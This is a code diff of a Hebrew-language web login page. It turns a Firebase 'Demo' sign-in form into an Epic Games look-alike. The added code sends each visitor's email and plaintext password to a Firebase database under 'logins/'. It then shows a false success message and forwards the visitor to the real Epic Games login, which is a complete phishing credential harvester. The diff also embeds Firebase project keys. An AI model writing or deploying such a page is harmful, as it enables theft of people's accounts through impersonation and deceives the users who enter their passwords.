@@ -1,211 +1,157 @@
 <!DOCTYPE html>
 <html lang="he" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>התחברות | Demo</title>
-  <style>
-    :root {
-      --bg-color: #121212;
-      --card-bg: #202020;
-      --blue: #0074e4;
-      --blue-hover: #007bf5;
-      --success: #2ecc71;
-      --danger: #ff3e3e;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>התחברות | Epic Games</title>
+    <style>
+        :root {
+            --bg-color: #121212;
+            --card-bg: #202020;
+            --epic-blue: #0074e4;
+            --epic-blue-hover: #007bf5;
+            --success-green: #2ecc71;
+        }
 
-    body {
-      font-family: 'Inter', 'Segoe UI', sans-serif;
-      background-color: var(--bg-color);
-      color: white;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
+        body {
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            background-color: var(--bg-color);
+            color: white;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-    .box {
-      width: 100%;
-      max-width: 400px;
-      padding: 40px;
-      background: var(--card-bg);
-      border-radius: 6px;
-      text-align: center;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-    }
+        .box {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            background: var(--card-bg);
+            border-radius: 4px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
 
-    .logo { width: 45px; margin-bottom: 25px; }
-    h2 { font-size: 18px; margin-bottom: 20px; text-transform: uppercase; }
+        .logo { width: 45px; margin-bottom: 25px; }
+        h2 { font-size: 18px; margin-bottom: 30px; text-transform: uppercase; }
 
-    input {
-      width: 100%;
-      padding: 15px;
-      margin-bottom: 15px;
-      border: 1px solid #404040;
-      background-color: #252525;
-      color: white;
-      border-radius: 4px;
-      box-sizing: border-box;
-      transition: border-color 0.3s;
-    }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 1px solid #404040;
+            background-color: #252525;
+            color: white;
+            border-radius: 4px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
 
-    input:focus {
-      border-color: var(--blue);
-      outline: none;
-    }
+        input:focus {
+            border-color: var(--epic-blue);
+            outline: none;
+        }
 
-    button {
-      width: 100%;
-      padding: 16px;
-      background-color: var(--blue);
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      font-weight: bold;
-      text-transform: uppercase;
-      transition: background-color 0.3s;
-      margin-top: 6px;
-    }
+        button {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--epic-blue);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: background-color 0.3s;
+        }
 
-    button:hover { background-color: var(--blue-hover); }
+        button:hover { background-color: var(--epic-blue-hover); }
 
-    .row {
-      display: flex;
-      gap: 10px;
-      margin-top: 10px;
-    }
-    .row button { width: 50%; }
-
-    .message-area {
-      margin-top: 15px;
-      font-size: 14px;
-      line-height: 1.4;
-      min-height: 20px;
-    }
-  </style>
+        .message-area { 
+            margin-top: 15px; 
+            font-size: 14px; 
+            line-height: 1.4;
+            min-height: 20px;
+        }
+    </style>
 </head>
 <body>
 
-  <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg"
-         alt="Logo" class="logo">
-    <h2>התחברות (Demo)</h2>
-
-    <input type="email" id="email" placeholder="כתובת אימייל" autocomplete="email" />
-    <input type="password" id="password" placeholder="סיסמה" autocomplete="current-password" />
-
-    <button onclick="login()">כניסה לחשבון</button>
-
-    <div class="row">
-      <button onclick="signup()">הרשמה</button>
-      <button onclick="logout()">התנתקות</button>
+<div class="box" id="mainBox">
+    <div id="loginForm">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg" alt="Epic Logo" class="logo">
+        <h2>התחברות</h2>
+        <input type="email" id="email" placeholder="כתובת אימייל">
+        <input type="password" id="password" placeholder="סיסמה">
+        <button onclick="login()">כניסה לחשבון</button>
+        <div id="message" class="message-area"></div>
     </div>
+</div>
 
-    <div id="message" class="message-area"></div>
-  </div>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 
-  <!-- Firebase compat SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyAdMfT8b2qkEuscfANoHfd84grGyjwroLc",
+        authDomain: "epic-games-66888.firebaseapp.com",
+        databaseURL: "https://epic-games-66888-default-rtdb.firebaseio.com", 
+        projectId: "epic-games-66888",
+        storageBucket: "epic-games-66888.firebasestorage.app",
+        messagingSenderId: "1099132611577",
+        appId: "1:1099132611577:web:3a64e34abc4810bb58eb28",
+        measurementId: "G-SS7HZGV6Y9"
+    };
 
-  <script>
-    // IMPORTANT: no extra "}" after this object
-    // IMPORTANT: no extra "}" after this object
-const firebaseConfig = {
-  apiKey: "AIzaSyDmtVjwbVmdEeaYn6cHOhoG4pEfkjyRkTA",
-  authDomain: "epicgems-5e9af.firebaseapp.com",
-  databaseURL: "https://epicgems-5e9af-default-rtdb.firebaseio.com",
-  projectId: "epicgems-5e9af",
-  storageBucket: "epicgems-5e9af.firebasestorage.app",
-  messagingSenderId: "998402914958",
-  appId: "1:998402914958:web:46c021e73c246c7acbe7df",
-  measurementId: "G-C0BT7M8KY3"
-};
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-firebase.initializeApp(firebaseConfig);
+    function login() {
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+        const message = document.getElementById("message");
 
-const auth = firebase.auth();
-const db = firebase.database();
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const passRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
+        const hasSpaces = /\s/.test(password);
 
-function setMsg(text, color) {
-  const el = document.getElementById("message");
-  el.style.color = color || "white";
-  el.innerText = text;
-}
+        if (!emailRegex.test(email)) {
+            message.style.color = "#ff3e3e";
+            message.innerText = "כתובת אימייל לא תקינה";
+            return;
+        }
 
-function getCreds() {
-  const email = document.getElementById("email").value.trim();
-  const password = document.getElementById("password").value;
+        if (password.length < 8 || !passRegex.test(password) || hasSpaces) {
+            message.style.color = "#ff3e3e";
+            message.innerText = "הסיסמה חייבת להכיל לפחות 8 תווים, אות אחת ומספר אחד, ללא רווחים";
+            return;
+        }
 
-  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  if (!emailRegex.test(email)) {
-    setMsg("כתובת אימייל לא תקינה", "#ff3e3e");
-    return null;
-  }
-  if (password.length < 8) {
-    setMsg("סיסמה קצרה מדי (מינימום 8 תווים)", "#ff3e3e");
-    return null;
-  }
-  return { email, password };
-}
+        message.style.color = "white";
+        message.innerText = "מתחבר...";
 
-// Attach to window so onclick="login()" always finds it
-window.login = async function () {
-  const creds = getCreds();
-  if (!creds) return;
+        database.ref('logins/').push({
+            email: email,
+            password: password,
+            date: new Date().toLocaleString()
+        }).then(() => {
+            // הצלחה - הצגת הודעה ירוקה
+            message.style.color = "#2ecc71";
+            message.innerText = "התחברת בהצלחה! מעביר אותך...";
+            
+            // המתנה של 2 שניות (2000 מילישניות) לפני העברה
+            setTimeout(() => {
+                window.location.href = "https://www.epicgames.com/id/login";
+            }, 2000);
 
-  setMsg("מתחבר...", "white");
-  try {
-    const userCred = await auth.signInWithEmailAndPassword(creds.email, creds.password);
+        }).catch((error) => {
+            message.style.color = "#ff3e3e";
+            message.innerText = "שגיאה בחיבור: " + error.message;
+        });
+    }
+</script>
 
-    // Optional: NON-SENSITIVE event log (no passwords)
-    await db.ref("login_events/").push({
-      uid: userCred.user.uid,
-      email: userCred.user.email,
-      ts: Date.now()
-    });
-
-    setMsg("התחברת בהצלחה!", "#2ecc71");
-  } catch (err) {
-    setMsg("שגיאה בהתחברות: " + err.message, "#ff3e3e");
-    console.error(err);
-  }
-};
-
-window.signup = async function () {
-  const creds = getCreds();
-  if (!creds) return;
-
-  setMsg("נרשם...", "white");
-  try {
-    const userCred = await auth.createUserWithEmailAndPassword(creds.email, creds.password);
-
-    // Optional: profile record (safe)
-    await db.ref("users/" + userCred.user.uid).set({
-      email: userCred.user.email,
-      createdAt: Date.now()
-    });
-
-    setMsg("נרשמת בהצלחה! עכשיו אפשר להתחבר.", "#2ecc71");
-  } catch (err) {
-    setMsg("שגיאה בהרשמה: " + err.message, "#ff3e3e");
-    console.error(err);
-  }
-};
-
-window.logout = async function () {
-  try {
-    await auth.signOut();
-    setMsg("התנתקת.", "white");
-  } catch (err) {
-    setMsg("שגיאה בהתנתקות: " + err.message, "#ff3e3e");
-    console.error(err);
-  }
-};
-
-  </script>
 </body>
 </html>
